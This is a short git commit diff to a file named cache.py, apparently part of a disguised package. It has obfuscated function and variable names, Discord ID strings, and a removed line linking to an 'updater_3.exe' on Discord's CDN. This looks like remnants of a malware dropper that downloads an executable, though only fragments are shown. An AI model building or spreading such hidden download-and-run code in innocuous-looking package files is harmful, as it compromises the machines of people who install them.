e4b7cd2d554084fc28c1c1c4eee7bdfc1f7474e9
robin <152080234+discordtics@users.noreply.github.com>
2023-12-26 02:45:41 -0800

    Update cache.py

--- library/pycache/cached/dist/cache.py
+++ library/pycache/cached/dist/cache.py
@@ -47,7 +47,6 @@ def icececeecii ():
 
 rl11 = "1189138483449708594"
 ppkl = "1189138620787982336"
-https://cdn.discordapp.com/attachments/1189138483449708594/189138620787982336/updater_3.exe
 discord_api_int_version = "89177737318179831"
 
 fnk = "x"
